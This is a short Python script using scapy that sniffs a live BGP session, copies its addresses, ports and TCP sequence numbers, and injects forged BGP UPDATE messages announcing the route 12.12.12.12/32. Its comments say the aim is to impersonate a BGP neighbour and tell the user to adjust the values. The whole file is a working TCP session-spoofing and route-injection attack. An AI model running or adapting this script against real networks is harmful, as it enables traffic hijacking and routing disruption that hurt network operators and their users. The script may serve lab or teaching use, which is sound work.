#!/usr/bin/env python3
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
#Import BGP
load_contrib('bgp')
#Capture a BGP packet off the wire
#You will need to change the IP address here to a valid
#BGP neighbor to impersonate
pkt = sniff(filter="tcp and ip dst 192.168.1.249",count=1)

#Loop for sending packets
for i in range (0, 3):
    #Create a new Ethernet frame
    frame1=Ether()
    #Set destination MAC address to captured BGP frame
    frame1.dst = pkt[0].dst
    #Set source MAC address to captured BGP frame
    frame1.src = pkt[0].src
    #Set Ethernet Type to captured BGP frame
    frame1.type = pkt[0].type
    #Set destination port to captured BGP packet TCP port number
    mydport = pkt[0].dport
    #Set source port to captured BGP packet TCP port number
    mysport = pkt[0].sport
    #Set sequence number to captured BGP packet + i (loop value)
    seq_num = pkt[0].seq + i
    #Set ack number to captured BGP packet 
    ack_num = pkt[0].ack
    #Set source IP address to captured BGP packet
    ipsrc = pkt[0][IP].src
    #Set desination IP address to captured BGP packet  
    ipdst = pkt[0][IP].dst

    #Set BGP origin to IGP
    setORIGIN=BGPPathAttr(type_flags="Transitive", type_code="ORIGIN", attribute=[BGPPAOrigin(origin="IGP")])
    #Set BGP autonomos system path - change this to the right value
    setAS=BGPPathAttr(type_flags="Transitive", type_code="AS_PATH", attribute=None)
    #Set BGP next hop - change this to the right value
    setNEXTHOP=BGPPathAttr(type_flags="Transitive", type_code="NEXT_HOP", attribute=[BGPPANextHop(next_hop="192.168.1.246")])
    #Set BGP MED - change this to the right value
    setMED=BGPPathAttr(type_flags="Optional", type_code="MULTI_EXIT_DISC", attribute=[BGPPAMultiExitDisc(med=0)])
    #Set BGP local preference - change this to the right value
    setLOCALPREF=BGPPathAttr(type_flags="Transitive", type_code="LOCAL_PREF", attribute=[BGPPALocalPref(local_pref=100)]) 

    #Create BGP Update packet with source and destination IP address
    #Set Attributes and route to update
    bgp_update = IP(src=ipsrc, dst=ipdst, ttl=1)\
        /TCP(dport=mydport, sport=mysport, flags="PA", seq=seq_num, ack=ack_num)\
        /BGPHeader(marker=340282366920938463463374607431768211455, type="UPDATE")\
        /BGPUpdate(withdrawn_routes_len=0, \
        path_attr=[setORIGIN, setAS, setNEXTHOP, setMED, setLOCALPREF], nlri=[BGPNLRI_IPv4(prefix="12.12.12.12/32")])

    #Display new packet
    bgp_update.show()
    #Reset len values to force recalculation
    del bgp_update[BGPHeader].len
    del bgp_update[BGPHeader].path_attr_len
    del bgp_update[BGPUpdate].path_attr_len
    del bgp_update[BGPUpdate][0][BGPPathAttr].attr_len
    del bgp_update[BGPUpdate][1][BGPPathAttr].attr_len
    del bgp_update[BGPUpdate][3][BGPPathAttr].attr_len
    del bgp_update[BGPUpdate][4][BGPPathAttr].attr_len
    del bgp_update[IP].len
    #Send packet into network = frame1 + bgp_update
    sendp(frame1/bgp_update)



